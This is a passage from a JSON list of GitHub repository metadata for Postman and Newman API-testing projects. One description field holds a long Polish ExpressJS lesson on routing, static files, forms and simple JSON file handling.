    "tags": []
  },
  {
    "id": 209249206,
    "name": "postman-test-practice",
    "full_name": "prashant18197/postman-test-practice",
    "description": null,
    "fork": false,
    "created_at": "2019-09-18T07:45:48Z",
    "updated_at": "2019-09-18T08:05:47Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 55481474,
    "owner_login": "prashant18197",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/55481474?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 90822415,
    "name": "postman-newman-test",
    "full_name": "vdespa/postman-newman-test",
    "description": null,
    "fork": false,
    "created_at": "2017-05-10T04:56:00Z",
    "updated_at": "2019-05-09T19:36:12Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 1197635,
    "owner_login": "vdespa",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/1197635?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 148581669,
    "name": "httpbin-postman-test",
    "full_name": "taysan003/httpbin-postman-test",
    "description": null,
    "fork": false,
    "created_at": "2018-09-13T04:25:21Z",
    "updated_at": "2018-09-13T04:33:05Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 12110742,
    "owner_login": "taysan003",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/12110742?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 211079105,
    "name": "postman-test-scripts-poc",
    "full_name": "cboiam/postman-test-scripts-poc",
    "description": "Poc of the automated pre request scripts and test scripts in postman",
    "fork": false,
    "created_at": "2019-09-26T12:03:47Z",
    "updated_at": "2019-11-14T17:03:11Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 38038695,
    "owner_login": "cboiam",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/38038695?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "request",
      "script",
      "auto",
      "automat",
      "scripts",
      "automate",
      "automated",
      "pre request"
    ]
  },
  {
    "id": 183202101,
    "name": "gemma-postman-tests",
    "full_name": "VNG-Realisatie/gemma-postman-tests",
    "description": null,
    "fork": false,
    "created_at": "2019-04-24T10:02:56Z",
    "updated_at": "2019-12-16T14:01:15Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 1,
    "watchers": 1,
    "score": 1,
    "owner_id": 34739001,
    "owner_login": "VNG-Realisatie",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/34739001?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 197026700,
    "name": "testing-and-automation",
    "full_name": "loopDelicious/testing-and-automation",
    "description": "Workshop for testing and automation in Postman",
    "fork": false,
    "created_at": "2019-07-15T15:36:28Z",
    "updated_at": "2019-07-22T23:45:05Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 17693714,
    "owner_login": "loopDelicious",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/17693714?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "auto",
      "automat",
      "automation",
      "shop"
    ]
  },
  {
    "id": 220861931,
    "name": "TestesAutomatizados",
    "full_name": "gomesevelyn/TestesAutomatizados",
    "description": "Realização de testes automatizados em API's via Postman",
    "fork": false,
    "created_at": "2019-11-10T22:50:48Z",
    "updated_at": "2019-11-11T09:50:19Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 25755076,
    "owner_login": "gomesevelyn",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/25755076?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "auto",
      "automat",
      "testes",
      "automatizado",
      "automatizados"
    ]
  },
  {
    "id": 117556886,
    "name": "test-postman-sample-t300",
    "full_name": "telosys-samples-v3/test-postman-sample-t300",
    "description": null,
    "fork": false,
    "created_at": "2018-01-15T14:40:49Z",
    "updated_at": "2018-01-15T14:54:38Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 35448619,
    "owner_login": "telosys-samples-v3",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/35448619?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 171877231,
    "name": "Test_Automation_Newman_API",
    "full_name": "sza313/Test_Automation_Newman_API",
    "description": "Test automation framework in Postman / Newman for API testing",
    "fork": false,
    "created_at": "2019-02-21T13:30:51Z",
    "updated_at": "2019-03-13T14:24:54Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 24241788,
    "owner_login": "sza313",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/24241788?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "auto",
      "automat",
      "framework",
      "automation"
    ]
  },
  {
    "id": 235815766,
    "name": "selenium-example",
    "full_name": "aplorenzen/selenium-example",
    "description": "An example of how Selenium IDE, selenium-side-runner, Postman and newman can be used to automate regression and smoke testing",
    "fork": false,
    "created_at": "2020-01-23T14:48:26Z",
    "updated_at": "2020-01-23T14:48:26Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 5021336,
    "owner_login": "aplorenzen",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/5021336?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "auto",
      "example",
      "automat",
      "newman",
      "runner",
      "automate",
      "side",
      "smoke",
      "regression",
      "selenium"
    ]
  },
  {
    "id": 205506231,
    "name": "parrot",
    "full_name": "cncal/parrot",
    "description": "A tool used to parse json file exported from Postman and generate apidoc automatically.",
    "fork": false,
    "created_at": "2019-08-31T06:34:57Z",
    "updated_at": "2019-09-02T09:51:31Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 23520240,
    "owner_login": "cncal",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/23520240?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "tool",
      "call",
      "json",
      "auto",
      "automat",
      "generate",
      "export",
      "automatic",
      "parse",
      "exported",
      "automatically",
      "apidoc"
    ]
  },
  {
    "id": 119091462,
    "name": "Zadanie_17_5",
    "full_name": "martinproxy0/Zadanie_17_5",
    "description": " 17. ExpressJS - ekspresowe tworzenie aplikacji w NodeJS Wyzwania: Dowiesz się czym jest ExpressJS Nauczysz się korzystać z routingu Poznasz czym są szablony 17.1. Wprowadzenie do Expressa Express jest jednym z najpopularniejszych frameworków dla aplikacji pisanych w Node.js. Jest bardzo lekki i pozwala na lepszą organizację aplikacji w modelu MVC. Ok, zwolnijmy. Już na samym starcie pojawiły się dwa pojęcia, których do tej pory nie omówiliśmy zbyt dokładnie: framework i MVC. Na początku przypomnijmy sobie czym jest framework.  Czym są frameworki? Framework to swego rodzaju szkielet, na którym opieramy budowę naszej aplikacji. Jest pewnym poziomem abstrakcji, na której konstruujemy naszą aplikację.  Czym jest abstrakcja? Abstrakcja w inżynierii oprogramowania to technika, dzięki której jesteśmy w stanie zapanować nad złożonością systemu. Najzwyczajniej w świecie nie da się myśleć na wielu płaszczyznach na raz, dlatego programiści dzielą problemy na pewne poziomy i to na nich rozwiązują mniejsze problemy. Przykładowo - programista korzystający z Reacta nie martwi się o niższy poziom abstrakcji, z którego nieświadomie korzysta używając Reacta. Korzystając z komputera także nie zastanawiamy się za bardzo co dzieje się w środku procesora czy też w jaki sposób jest skonstruowany. Tym poziomem abstrakcji po prostu nie zawracamy sobie głowy. Używając JavaScriptu nie myślimy w jaki sposób parser analizuje składnię języka. Jeśli nie jest to nam potrzebne, to możemy zająć się tym, co jest dla nas naprawdę istotne - pisaniem aplikacji internetowych!  Express to właśnie kolejny, wyższy poziom abstrakcji, dzięki któremu możemy skupić się na właściwym problemie. Zawiera zbiór generycznych (możliwych do zastosowania w wielu miejscach / uniwersalnych) funkcjonalności, które powtarzają się w obrębie każdej aplikacji. Cały zamysł frameworka opiera się na zasadzie - nie wymyślaj koła na nowo, bo można budować na podstawie dobrych, uniwersalnych rozwiązań. Po wykonaniu tego samego zadania wiele razy, człowiek instynktownie szuka sposobu na automatyzację problemu - szczególnie leniwy programista. :)  Framework ma niestety jedną wadę, która bywa momentami również zaletą - narzuca programiście sposób w jaki należy rozwiązać problem. Takie podejście z jednej strony nieco nas ogranicza, bo nie pozwala nam 'grzebać' w rozwiązaniu, a z drugiej strony zmniejsza ilość miejsc, w których moglibyśmy popełnić jakiś błąd. Zaletą takiego podejścia jest też to, że programiści korzystający z frameworków często borykają się z podobnymi problemami, przez co łatwo jest znaleźć rozwiązania, bo ktoś już na pewno zetknął się z czymś, co sprawia nam kłopot :)  Wracając do Expressa - jest on niewielkim frameworkiem, który daje programiście przyjemną podstawkę do tworzenia aplikacji, ale nie narzuca żadnych praktyk - może o tym świadczyć chociażby fakt, że wiele znanych frameworków opiera swoją budowę na Express. Można do nich zaliczyć przykładowo Loopbacka, Sailsa czy Krakena.  Model-View-Controller Ok, wiemy już czym jest framework - pora na pojęcie MVC :) Jest to skrót od ang. Model View Controller (Model Widok Kontroler). Jest jednym z najczęściej przewijających się wzorców architektonicznych w internecie. Popularnością pomału wypiera go architektura Flux, o której coraz częściej słychać (szczególnie w środowisku Reacta), ale o tym wzorcu powiemy sobie jeszcze przy okazji omawiania Reduxa - wróćmy do MVC.  Głównym założeniem przyjętym podczas projektowania MVC było oddzielenie warstwy prezentacji od logiki biznesowej aplikacji. To podejście umożliwia tworzenie narzędzi działających bez graficznego interfejsu (zastępuje go wtedy tzw. Command Line Interface, a.k.a. CLI) i jest dalej popularne w środowisku Unixowym. Tak więc:  Model jest reprezentacją logiki aplikacji / problemu z jakim się zmagamy / domeną. Widok opisuje w jaki sposób coś wyświetlić. W React są to komponenty (szczególnie te prezentacyjne). Kontroler przyjmuje dane od użytkownika aplikacji i reaguje na jego działania w obrębie widoku. Aktualizuje widok i model aplikacji. O samej architekturze można napisać osobny moduł tym bardziej, że jak już wcześniej wspomnieliśmy bardzo często przewija się on w środowisku front-end developerów i jest częścią składową wielu frameworków. Sama implementacja MVC wymaga wiedzy na temat programowania obiektowego i wzorców projektowych. Zainteresowanych zapraszam do przeczytania tej książki na temat wzorców projektowych stosowanych w JavaScripcie.  Express dostarcza wielu funkcjonalności do tworzenia aplikacji webowych. Jak już wspomniałem, ułatwia on przede wszystkim szybki rozwój aplikacji opartych na Node.js. Podstawowymi cechami tego frameworka są:  serwowanie plików statycznych za pomocą jednej komendy konfigurowanie middleware, czyli pośrednika między żądaniem a odpowiedzią w momencie, kiedy użytkownik wykonuje jakieś akcje, np. wysyła formularz, middleware może wykonać pewne czynności zanim dane zostaną zapisane. Nie sprowadza się to oczywiście tylko do zapisu danych, ale szerzej na temat tego zagadnienia powiemy sobie w dalszym rozdziale definiowanie tablicy routingu, czyli ścieżek (adresów), które wyświetlają odpowiednie treści, przyjmują i zapisują dane, bądź odpytane o dane zwracają je. Bazują na protokole HTTP oraz URI (ang. Uniform Resource Identifier) pozwala na dynamiczne tworzenie stron HTML bazujących na argumentach przekazanych do istniejących szablonów Nie przejmuj się, jeśli powyższe opisy wydają się być nieco zagmatwane. Kolejne rozdziały rozjaśnią sprawę! Zanim jednak przejdziemy do omawiania poszczególnych funkcjonalności Expressa, przeprowadzimy proces instalacji.  Jeśli masz wątpliwości do powyższego materiału, to - zanim zatwierdzisz - zapytaj na czacie :) Zapoznałe(a)m się! 17.2. Instalacja ExpressJS Framework Express instalujemy używając npm, analogicznie do innych pakietów, które dodawaliśmy już we wcześniejszych modułach. Dla przypomnienia, wystarczy, że zainicjujesz swój projekt - npm init, a następnie użyjesz komendy npm install express --save, która zapisze zainstalowany pakiet w katalogu node_modules/ i doda go do sekcji dependencies w pliku package.json.  Razem z Expressem należy zainstalować jeszcze jeden ważny moduł - body-parser, który jest pakietem pozwalającym na obsługę różnych formatów danych w middleware takich jak JSON, text czy tzw. surowe dane (ang. raw data). Aby go zainstalować, wpisz npm install body-parser --save.  Pierwsza aplikacja w ExpressJS Sprawdźmy teraz, czy wszystko działa tak jak powinno. Testowa aplikacja, jaką stworzymy przy użyciu Expressa, będzie przedstawiała podstawową zasadę działania tego frameworka. Aplikacja uruchomi serwer oraz będzie nasłuchiwać na porcie 3000 w oczekiwaniu na połączenie - dokładnie w taki sam sposób, jak w przypadku serwera HTTP napisanego w “czystym\" Node.js. Nasłuchiwanie oznacza nic innego jak oczekiwanie na połączenie - po wystąpieniu żądania, serwer odpowie nam klasycznym “Hello world\".  Zanim zaczniemy tworzyć aplikację, musimy wytłumaczyć sobie pewne pojęcia.  Opis pojęcia routingu Routing to sposób określania jak aplikacja będzie odpowiadać na żądania klienta na dane endpointy przy użyciu konkretnych metod HTTP. Przypomnijmy sobie w jaki sposób wyglądały metody HTTP:  GET - najprostsza z metod HTTP - służy do pobierania zasobów z serwera. Pobranymi zasobami mogą być np. pliki HTML, CSS, JavaScript czy obiekty JSON / XML. POST - ta metoda jest używana do wysyłania danych do serwera. Stosuje się ją np. przy formularzach lub przy wstawianiu zdjęć i wysyłaniu ich jako załącznik. Zwykle dane te wysyłane są jako para klucz-wartość. PUT - działa podobnie jak POST, czyli również służy do wysyłania danych. Różnicą jest ograniczenie do wysłania tylko jednej porcji danych - np. jednego pola. Metoda ta najczęściej używana jest do aktualizacji istniejących danych DELETE - metoda, która służy do usuwania danych z serwera. Chodzi oczywiście o dane, które zostały wskazane przy wysyłaniu żądania. Kolejnym pojęciem jest URI (nazywane również PATH) - jest to właśnie wspomniany wcześniej endpoint, który zawiera polecenia do wykonania gdy zostanie wywołany przez żądanie.  Czas start! Na początek stwórzmy plik server.js w katalogu z projektem. Po zainstalowaniu powyższych zależności, drzewo projektu powinno wyglądać w następujący sposób:   Aby mieć możliwość skorzystania z zainstalowanych zależności, na początku należy zadeklarować zmienną, w której będziemy przechowywać funkcjonalności pakietu Expressa.  var express = require('express'); Jak widzisz, każda paczka JS'a działa dokładnie w taki sam sposób. Koncepcja modułów będzie przewijać się aż do końca tego kursu. Następnym krokiem będzie stworzenie aplikacji Express:  var app = express(); Naszą aplikację przypisaliśmy do zmiennej app. Teraz możemy sprawić, aby odpowiadała prostym Hello world w momencie, w którym odbierzemy wysłane zapytanie GET na adres strony domowej:  app.get('/', function(req, res) {     res.send('Hello world'); }); Powyższy kod rejestruje pierwszy routing (proces przetwarzania otrzymanego adresu żądania i na jego podstawie decydowanie, co powinno zostać uruchomione) na wysłane żądanie GET po wejściu na stronę główną ( http://localhost:3000/ ). Jako callback na wystąpienie tego zdarzenia wywoływana jest funkcja, która w przypadku udanej odpowiedzi wyśle wiadomość Hello world.  To jednak jeszcze nie koniec. Zarejestrowaliśmy obsługę pierwszego routingu, ale należy zainicjować nasłuchiwanie serwera na to i inne zdarzenia. Dopiszmy więc:  var server = app.listen(3000, function() {     console.log('Przykładowa aplikacja nasłuchuje na http://localhost:3000'); }); Po zapisaniu powyższego kodu, należy uruchomić go komendą node server.js (lub za pomocą Nodemona, którego poznaliśmy w pierwszym module) - teraz po ponownym wejściu na adres http://localhost:3000/ powinniśmy zobaczyć następujący widok:   Jest to znak, że nasza aplikacja działa!  Jeśli masz wątpliwości do powyższego materiału, to - zanim zatwierdzisz - zapytaj na czacie :) Zapoznałe(a)m się! 17.3. Route, czyli ścieżka wyznaczona dla użytkownika aplikacji Wykorzystanie endpointów Rozwińmy teraz trochę aplikację stworzoną w poprzednim podrozdziale. Aktualnie kod w pliku server.js wygląda następująco:  var express = require('express'); var app = express();  app.get('/', function (req, res) {     res.send('Hello world'); });  var server = app.listen(3000, function() {     console.log('Przykładowa aplikacja nasłuchuje na http://localhost:3000'); }); Endpointy statyczne Na początek zmodyfikujemy lekko żądanie GET i do strony głównej zamiast Hello world! wpiszmy Hello GET! oraz dodamy linijkę drukującą otrzymane żądanie (po stronie serwera) jak poniżej:  app.get('/', function (req, res) {     console.log('Otrzymałem żądanie GET do strony głównej');     res.send('Hello GET!'); }); Warto w tym miejscu wspomnieć o narzędziu Postman - możesz pobrać je ze strony https://www.getpostman.com/. Używa się go do testowania endpointów. Postman jest prosty i intuicyjny w obsłudze - wystarczy, że podasz adres oraz metodę HTTP, jakiej chcesz użyć w odpowiednich polach i… już :) Pozostaje tylko wysłanie requesta i sprawdzenie czy response zgadza się z naszymi oczekiwaniami.   Dodajmy też inne metody HTTP do naszej aplikacji. Zacznijmy od POST. Dla tej i kolejnej metody wykonamy podobne operacje. Chodzi tutaj o to, aby zaobserwować działanie zarejestrowanych endpointów.  app.post('/', function (req, res) {     console.log('Otrzymałem żądanie POST do strony głównej');     res.send('Hello POST!'); }); Do tego czasu oba nasze zapytania kierowaliśmy do strony domowej. Dodajmy teraz obsługę żądania z metodą DELETE oraz inną ścieżką:  app.delete('/del_user', function (req, res) {     console.log('Otrzymałem żądanie DELETE do strony /del_user');     res.send('Hello DELETE!'); }); DLA CHĘTNYCH: Przetestuj powyższe zapytanie w Postmanie! :)  Dla praktyki, dodajmy jeszcze kilka innych endpointów, a następnie przejdźmy do testowania.  app.get('/list_user', function (req, res) {     console.log('Otrzymałem żądanie GET do strony /list_user');     res.send('Strona z listą użytkowników!'); });  app.get('/ab*cd', function(req, res) {     console.log('Otrzymałem żądanie GET do strony /ab*cd');     res.send('Wzór pasuje'); }); Po dodaniu powyższych fragmentów kodu zapisz plik server.js, a następnie ponownie użyj komendy node server.js chyba, że używasz Nodemona :)  Zerknijmy na endpoint /list_user   Otrzymaliśmy to, czego oczekiwaliśmy. Sprawdźmy jeszcze inne.    Jeśli jednak użyliśmy endpointa, którego nie zdefiniowaliśmy, otrzymamy odpowiedź jak na ostatnim obrazku.  Endpointy dynamiczne Istnieje również inny typ endpointów, które nazywa się dynamicznymi. Używanie ich pozwala na przekazywanie parametrów i bazowanie na nich. Wróćmy na moment do kodu stworzonego na samym początku:  var express = require('express'); var app = express();  app.get('/', function (req, res) {     res.send('Hello world'); });  var server = app.listen(3000, function() {     console.log('Przykładowa aplikacja nasłuchuje na http://localhost:3000'); }); Najpierw zmodyfikujemy trochę bazowy kod. Usuńmy linijki 8-10, które miały nam tylko pokazać podstawowe informacje na temat serwera. Zamiast tego napiszmy po prostu: app.listen(3000);  Tworzenie dynamicznego routingu pozwala na przekazywanie parametrów, więc spróbujmy najpierw z przykładowym id. Zamiast odwołać się do strony domowej ('/'), odwołajmy się do zmiennego parametru id. Parametr zmienny od statycznego rozróżnia się poprzez dodanie dwukropka (:) przed nazwę. W naszym przykładzie endpoint będzie więc wyglądał następująco:  /:id Zmieńmy jeszcze odpowiedź z Hello world na 'Identyfikator, który został dopisany to ' + req.params.id.  Czym jest req.params.id? req jest obiektem reprezentującym zapytanie HTTP (ang. request). Posiada on różne parametry, jak na przykład body (czyli ciało zapytania), nagłówki HTTP oraz parametry (params), które mamy zamiar odczytać.  Parametr, który wstawiliśmy jako część adresu w metodzie GET, przekazujemy jako id. W poniższym przypadku wyświetli się komunikat Identyfikator który został dopisany to 123, o ile zapytanie wysłano na adres http://localhost:3000/123.   Popróbuj z różnymi innymi parametrami i sprawdź czy aplikacja działa tak, jak tego oczekujesz.  Obsługa błędu 404 za pomocą ExpressJS Co jeśli serwer nie rozpozna żądania? W Expressie odpowiedź 404 nie jest wynikiem błędu, więc nie jest wyłapywany w trakcie działania aplikacji. Spowodowane jest to tym, że 404 zwykle oznacza brak możliwości wykonania danej czynności, a nie błąd występujący z powodu jakiejś 'wpadki' programisty. Innymi słowy, Express wykonał wszystkie funkcje middleware (które poznamy w kolejnym rozdziale) oraz route'y i dopiero wtedy dowiedział się, że żaden z nich nie odpowiedział na żądanie - taki przypadek możemy obsłużyć poprzez dodanie funkcji middleware na samym końcu (poniżej pozostałych funkcji), aby obsługiwała status 404.  Powróćmy znów do poprzedniego szablonu z metodą GET na stronę domową ('/'), która zwraca nam Hello world!. Dopiszmy teraz metodę middleware, która obsłuży nam błąd 404.  Na samym końcu, poniżej fragmentu z nasłuchiwaniem dodajmy obsługę odpowiedzi 404:  app.use(function (req, res, next) {     res.status(404).send('Wybacz, nie mogliśmy odnaleźć tego, czego żądasz!') }); Po ponownym uruchomieniu skryptu, w przeglądarce powinieneś zobaczyć Hello world!. Spróbuj teraz dopisać coś na koniec adresu (tak jak w poprzednim rozdziale dopisaliśmy id). Powinieneś otrzymać następujący komunikat:   Parametr next, który przekazujemy do funkcji jest funkcją, która pozwala “iść dalej\" do kolejnej funkcji middleware lub zakończenia żądania.  Można w ten sposób stworzyć także obsługę pozostałych błędów. Najczęściej obsługiwane błędy to:  400 - bad request - występuje gdy serwer nie może przetworzyć zapytania 401 - unauthorized - występuje gdy wymagane jest uwierzytelnienie, a nie zostało dostarczone 403 - forbidden - żądanie jest poprawne, jednak serwer odmawia odpowiedzi, może to wystąpić w przypadku gdy np. użytkownik jest zalogowany ale nie ma uprawnień do wykonania żądania 404 - not found - zasoby nie zostały znalezione 500 - internal server error - występuje gdy występują nieznane warunki i nie ma żadnej konkretnej wiadomości Zadanie: Operacje CRUD na pliku JSON Stwórzmy teraz aplikację, która będzie otwierać zewnętrzne pliki .json oraz edytować je. Zanim zaczniemy, w folderze projektu stwórz plik server.js, a następnie zainicjalizuj projekt poprzez wpisanie npm init w konsoli.  Przejdźmy do pobrania potrzebnych zależności - tym razem będzie nam potrzebny Express oraz body-parser. Jak się zapewne domyślasz, możesz zainstalować je za pomocą komendy npm install --save express body-parser. Po pobraniu paczek, możemy śmiało przejść do pisania kodu - na początek przypisz zależności do zmiennych w pliku server.js. Dodaj także linijkę var fs = require('fs') - fs będzie nam potrzebny do operacji na plikach. Nie musimy go instalować, bo jest on wbudowany w Node :)  Skoro zależności mamy już załatwione, zadeklaruj zmienną app, która wywoła funkcję express() oraz zmienną stringifyFile (na razie bez zadeklarowanej wartości).  Tuż pod deklaracją zmiennych dodaj także linijkę app.use(bodyParser.json()); - to pozwoli Ci wykorzystać middleware body-parser, które zainstalowaliśmy przed chwilą. body-parser jest nam potrzebny, aby korzystać z formatu application/json - póki co nie przejmuj się pojęciem middleware, zajmiemy się nim nieco dalej w tym kursie :)  Stwórz teraz endpoint GET /getNote, gdzie po wywołaniu zostanie wczytany Twój zewnętrzny plik JSON oraz wyświetlona zostanie jego zawartość. Przykłądowy plik test.json:  {\"menu\": {    \"id\": \"file\",    \"value\": \"File\",    \"popup\": {      \"menuitem\": [        {\"value\": \"New\", \"onclick\": \"CreateNewDoc()\"},        {\"value\": \"Open\", \"onclick\": \"OpenDoc()\"},        {\"value\": \"Close\", \"onclick\": \"CloseDoc()\"}      ]    }  }} Metoda która pozwoli nam na odczytanie pliku to readFile, którą można wywołać z zadeklarowanego wcześniej fs. Jako parametry przyjmuje ona najpierw plik, następnie opcje (np. kodowanie) i funkcję, która wywoła się po załadowaniu. W naszym przypadku będzie to więc następujący kod: fs.readFile('./test.json', 'utf8', function(err, data) {     if (err) throw err;     stringifyFile = data     res.send(data); }); Teraz pora na stworzenie endpointa, który po wywołaniu nadpisze nam podany plik. Stworzymy do tego dynamiczny endpoint, który dopisze do pliku string, który przekażemy jako parametr. Stwórz tym razem POST na /updateNote/:note. Po jego wywołaniu tekst, który znajduje się w miejscu /:note powinniśmy dopisać do wczytanego pliku poprzez dodanie req.params.note do zmiennej stringifyFile, która przechowuje aktualną zawartość pliku.  Po przypisaniu powyższej zmiennej, należy ponownie odwołać się do modułu fs tym razem używając metody writeFile. Pomoże nam w tym następujący fragment kodu:  fs.writeFile('./test.json', stringifyFile, function(err) {     If (err) throw err;     console.log('file updated'); }); Na końcu pliku dodaj nasłuchiwanie na porcie 3000.  Zapisz plik i uruchom aplikację wpisując node server.js w konsoli.  Otwórz Postmana, ustaw metodę zapytania na GET, a w pole adresu wpisz http://localhost:3000/getNote. Jako response powinieneś otrzymać Twój stworzony wcześniej plik JSON. Po zmianie z GET na POST oraz wpisaniu /updateNote/test zamiast /getNote oraz wysłaniu requesta, Twój plik JSON powinien zostać zaktualizowany o słowo test :)  Po ukończeniu zadania, wrzuć swój kod na Githuba i przekaż link do repozytorium mentorowi :)  Podgląd zadania  https://github.com/martinproxy0/Zadanie_17_3.git   Wyslij link  17.4. Serwowanie plików statycznych Express posiada wbudowaną możliwość serwowania plików statycznych - takimi plikami są na przykład obrazki, pliki CSS czy JS. Aby serwować te pliki statycznie, wystarczy użyć express.static. Pliki statyczne to pliki, które zostają dostarczone do klienta bez generowania, modyfikacji czy przetwarzania - jedyne, co trzeba z nimi zrobić, to przekazać nazwę katalogu, w którym są przetrzymywane, do express.static - to wystarczy aby zacząć je serwować. Spróbujmy przedstawić to sobie na przykładzie.  Załóżmy, że przetrzymujesz swoje zdjęcia i pliki CSS w katalogu assets/. Aby zacząć je serwować, możesz więc użyć następującej linijki:  app.use(express.static('assets')); Zmodyfikujmy więc całkowicie naszą aplikację. Najpierw stwórzmy w katalogu projektu nowy katalog o nazwie assets/. Wrzućmy do niego jakiekolwiek zdjęcie/obrazek. W pliku server.js wróćmy do poprzedniego stanu (zanim zaczęliśmy zajmować się routingiem):  var express = require('express'); var app = express();  app.get('/', function (req, res) {     res.send('Hello world'); });  var server = app.listen(3000, 'localhost', function() {     var host = server.address().address;     var port = server.address().port;      console.log('Przykładowa aplikacja nasłuchuje na http://' + host + ':' + port); }); W tym przykładzie sami definiujemy port i adres, ale w prawdziwej aplikacji moglibyśmy tych wartości nie znać. Częstym przykładem jest sytuacja w której adres i port są zdefiniowane w osobnym pliku konfiguracyjnym. Ten plik byłby inny na naszym komputerze niż na serwerze na którym będziemy publikować aplikację - ale nasz kod ma działać w obu lokalizacjach. Dlatego do wyświetlenia linka potrzebowalibyśmy pobrania tych danych za pomocą metody .address().  Pozostaje teraz jedynie w linii nr 3 dodać to, o czym powiedzieliśmy sobie chwilkę temu, czyli linijkę app.use(express.static('assets'));  Dla przypomnienia, w nawiasach do express.static przekazujemy katalog, w którym znajdują się pliki, które chcemy serwować. Po zapisaniu pliku server.js, możemy uruchomić aplikację. Teraz, aby zobaczyć nasz obrazek, wystarczy że po http://localhost:3000/ podamy nazwę pliku z rozszerzeniem - u mnie wygląda to tak:   Stwórz sobie teraz prosty plik index.html, który będzie miał formularz z dwoma inputami typu text (o nazwach first_name i last_name) oraz jednym typu submit. Element  posiada atrybuty takie jak action oraz method. Atrybut action pozwala określić, gdzie wysłać dane z formularza w momencie, gdy zostanie on zatwierdzony. W naszym przypadku będzie to http://localhost:3000/userform. Atrybut method określa metodę, jakiej chcemy użyć - w naszym przypadku niech będzie to GET.  Przykładowo, Twój index.html może wyglądać tak:                          Node Hello world example                                                 First Name:                                            Last Name:                                           Gdy już będzie gotowy, wrzuć go do katalogu /assets.  Teraz czas na modyfikację pliku server.js. Najpierw zmieńmy to, co chcemy wysyłać, gdy zostanie wysłane żądanie do strony domowej.  Zamień więc res.send('Hello world') na res.sendFile('/index.html') - jak się zapewne domyślasz, res.sendFile() wysyła w odpowiedzi plik zamiast wiadomości.  Musimy również dodać obsługę żądania na endpoint, do którego będziemy kierować nasz formularz.  app.get('/userform', function (req, res) {     const response = {         first_name: req.query.first_name,         last_name: req.query.last_name     };     res.end(JSON.stringify(response)); }); W czasie przetwarzania żądania, tworzymy nowy obiekt response, który ma klucze first_name oraz last_name. Do poszczególnych właściwości przypisujemy dane, które otrzymujemy w obiekcie req (od ang. request), czyli w obiekcie z żądaniem. Na koniec wyświetlamy nasz obiekt przetworzony na typ string za pomocą metody JSON.stringify. Po zapisaniu pliku server.js, aplikacja powinna pokazywać formularz, jak poniżej.   Po wpisaniu wartości do inputów i wysłaniu ich, powinieneś zostać przekierowany do strony /userform, a po znaku zapytania powinny zostać wyświetlone parametry umieszczone przez Ciebie w inputach.   Zadanie: Żonglujemy danymi pomiędzy endpointami Napisz kod obsługujący formularz zgodnie z wskazówkami z tego submodułu, a następnie wyślij swój kod na repozytorium oraz przekaż go do sprawdzenia mentorowi.  Podgląd zadania  https://github.com/martinproxy0/Zadanie_17_4.git   Wyslij link 17.5. Middleware - pośrednik między żądaniem a odpowiedzią",
    "fork": false,
    "created_at": "2018-01-26T19:03:05Z",
    "updated_at": "2018-01-26T19:03:38Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 13038633,
    "owner_login": "martinproxy0",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/13038633?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "repo",
      "data",
      "request",
      "form",
      "file",
      "application",
      "server",
      "call",
      "node",
      "json",
      "http",
      "user",
      "develop",
      "express",
      "auto",
      "example",
      "automat",
      "implement",
      "format",
      " express",
      "auth",
      "endpoint",
      "framework",
      "route",
      "https",
      "function",
      "demo",
      "send",
      "local",
      "list",
      "star",
      "source",
      "read",
      "front",
      "update",
      "response",
      "stat",
      "host",
      "start",
      "delete",
      "face",
      "package",
      "method",
      "info",
      "developer",
      "system",
      "name",
      "html",
      "action",
      "module",
      "program",
      "infor",
      "github",
      "model",
      "tech",
      "esse",
      "text",
      "getpost",
      "problem",
      "install",
      "parse",
      "link",
      "proxy",
      "folder",
      "status",
      "require",
      "middleware",
      "parser",
      "console",
      "intern",
      "note",
      "popular",
      "party",
      "write",
      "query",
      "sets",
      "updated",
      "dynamic",
      "modules",
      "routing",
      "role",
      "world",
      "address",
      "dependencies",
      "found",
      "error",
      "internal",
      "listen",
      "jest",
